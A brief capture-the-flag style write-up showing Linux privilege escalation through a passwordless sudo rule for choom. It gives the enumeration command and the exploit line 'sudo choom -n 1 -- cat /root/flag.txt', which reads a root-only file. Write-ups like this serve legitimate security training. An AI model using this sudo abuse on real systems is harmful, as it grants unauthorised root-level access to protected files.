# Linux Privilege Escalation - choom Exploit

## Description
This task demonstrates privilege escalation using a misconfigured sudo permission.

## Step 1: Enumeration
Checked sudo permissions:
sudo -l

## Step 2: Vulnerability
User can run /usr/bin/choom as root without password.

## Step 3: Exploitation
Executed command as root:
sudo choom -n 1 -- cat /root/flag.txt

## Result
Successfully retrieved the root flag.
